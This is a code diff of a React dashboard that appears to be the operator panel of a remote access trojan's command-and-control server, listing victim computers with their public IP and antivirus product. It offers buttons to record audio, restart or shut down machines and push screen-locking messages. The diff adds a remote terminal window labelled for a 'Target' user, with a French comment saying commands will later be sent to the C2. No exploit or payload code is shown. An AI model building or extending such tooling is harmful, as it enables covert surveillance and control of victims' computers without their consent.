@@ -22,6 +22,10 @@ export default function Dashboard() {
   const [screenshots, setScreenshots] = useState<string[]>([]);
   const [chatMessages, setChatMessages] = useState<{from: string, text: string}[]>([]);
   const [chatInput, setChatInput] = useState("");
+  const [activePC, setActivePC] = useState<string | null>(null);
+  const [showTerminal, setShowTerminal] = useState(false);
+  const [terminalOutput, setTerminalOutput] = useState<string[]>(["Microsoft Windows [Version 10.0.19045.4412]", "(c) Microsoft Corporation. Tous droits réservés.", ""]);
+  const [terminalInput, setTerminalInput] = useState("");
 
   useEffect(() => {
     const fetchComputers = async () => {
@@ -53,20 +57,14 @@ export default function Dashboard() {
 
   const getAvIcon = (av: string) => {
     const lowAv = av.toLowerCase();
-    if (lowAv.includes('bitdefender')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Bitdefender_Logo.svg/128px-Bitdefender_Logo.svg.png";
-    if (lowAv.includes('avast')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Avast_logo.svg/128px-Avast_logo.svg.png";
-    if (lowAv.includes('kaspersky')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Kaspersky_Lab_logo.svg/128px-Kaspersky_Lab_logo.svg.png";
+    if (lowAv.includes('bitdefender')) return "https://www.google.com/s2/favicons?domain=bitdefender.com&sz=128";
+    if (lowAv.includes('avast')) return "https://www.google.com/s2/favicons?domain=avast.com&sz=128";
+    if (lowAv.includes('kaspersky')) return "https://www.google.com/s2/favicons?domain=kaspersky.com&sz=128";
     if (lowAv.includes('defender')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Microsoft_Windows_Defender_icon.svg/128px-Microsoft_Windows_Defender_icon.svg.png";
-    if (lowAv.includes('avg')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/AVG_logo.svg/128px-AVG_logo.svg.png";
-    if (lowAv.includes('norton')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/4/43/Norton_logo.svg/128px-Norton_logo.svg.png";
-    if (lowAv.includes('eset') || lowAv.includes('nod32')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/ESET_Logo.svg/128px-ESET_Logo.svg.png";
-    if (lowAv.includes('mcafee')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/McAfee_logo.svg/128px-McAfee_logo.svg.png";
-    if (lowAv.includes('avira')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Avira_Logo.svg/128px-Avira_Logo.svg.png";
-    if (lowAv.includes('malwarebytes')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Malwarebytes_logo.svg/128px-Malwarebytes_logo.svg.png";
-    if (lowAv.includes('sophos')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Sophos_Logo.svg/128px-Sophos_Logo.svg.png";
-    if (lowAv.includes('trend micro')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Trend_Micro_Logo.svg/128px-Trend_Micro_Logo.svg.png";
-    if (lowAv.includes('panda')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Panda_Security_logo.svg/128px-Panda_Security_logo.svg.png";
-    if (lowAv.includes('totalav')) return "https://www.totalav.com/images/totalav-logo-white.png";
+    if (lowAv.includes('avg')) return "https://www.google.com/s2/favicons?domain=avg.com&sz=128";
+    if (lowAv.includes('norton')) return "https://www.google.com/s2/favicons?domain=norton.com&sz=128";
+    if (lowAv.includes('eset')) return "https://www.google.com/s2/favicons?domain=eset.com&sz=128";
+    if (lowAv.includes('mcafee')) return "https://www.google.com/s2/favicons?domain=mcafee.com&sz=128";
     return "https://cdn-icons-png.flaticon.com/512/752/752712.png"; 
   };
 
@@ -183,10 +181,10 @@ export default function Dashboard() {
                   </h3>
                   <p className="text-xs text-gray-400 mt-1">{pc.public_ip}</p>
                 </div>
-                <div className={`px-2 py-1 rounded text-xs font-bold ${isOnline(pc.last_seen) ? 'bg-green-500/10 text-green-400 border border-green-500/20' : 'bg-gray-500/10 text-gray-400 border border-gray-500/20'}`}>
-                  {isOnline(pc.last_seen) ? 'ONLINE' : 'OFFLINE'}
+                <div className="flex items-center gap-2">
+                  <div className={`w-2.5 h-2.5 rounded-full ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_10px_#22c55e] animate-pulse' : 'bg-gray-600'}`}></div>
+                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={18}/></button>
                 </div>
-                <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-600 hover:text-red-500 transition-colors ml-2" title="Delete PC"><X size={16}/></button>
               </div>
               <div className="grid grid-cols-2 gap-4 mb-6">
                 <div className="bg-white/5 p-4 rounded-xl border border-white/10 flex items-center gap-3">
@@ -214,7 +212,7 @@ export default function Dashboard() {
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'audio')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Record Audio"><Mic size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
                 
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'cmd')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Calculator (Test CMD)"><Terminal size={18}/></button>
+                <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18}/></button>
               </div>
@@ -268,6 +266,41 @@ export default function Dashboard() {
                 placeholder="Type a message to lock their screen with..." 
               />
               <button onClick={sendChatMessage} className="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded-lg font-bold text-sm">Send</button>
+            </div>
+          </div>
+        </div>
+      )}
+      {/* Terminal Modal */}
+      {showTerminal && (
+        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+          <div className="w-full max-w-4xl bg-[#0c0c0c] rounded-lg border border-gray-700 shadow-2xl overflow-hidden font-mono">
+            <div className="bg-[#2d2d2d] px-4 py-2 flex justify-between items-center border-b border-gray-600">
+              <div className="flex items-center gap-2 text-xs text-gray-300">
+                <Terminal size={14} />
+                <span>Invite de commande - {activePC}</span>
+              </div>
+              <button onClick={() => setShowTerminal(false)} className="text-gray-400 hover:text-white"><X size={18}/></button>
+            </div>
+            <div className="p-4 h-[500px] overflow-y-auto text-sm text-gray-200 custom-scrollbar">
+              {terminalOutput.map((line, i) => (
+                <div key={i} className="min-h-[1.2rem]">{line}</div>
+              ))}
+              <div className="flex gap-2 items-center mt-2">
+                <span className="text-gray-400">C:\Users\Target\Desktop&gt;</span>
+                <input 
+                  autoFocus
+                  className="bg-transparent border-none outline-none flex-1 text-gray-200"
+                  value={terminalInput}
+                  onChange={(e) => setTerminalInput(e.target.value)}
+                  onKeyDown={(e) => {
+                    if (e.key === 'Enter' && terminalInput) {
+                      setTerminalOutput([...terminalOutput, `C:\\Users\\Target\\Desktop>${terminalInput}`, "Executing command on remote agent..."]);
+                      setTerminalInput("");
+                      // Ici on enverra la vraie commande au C2 plus tard
+                    }
+                  }}
+                />
+              </div>
             </div>
           </div>
         </div>
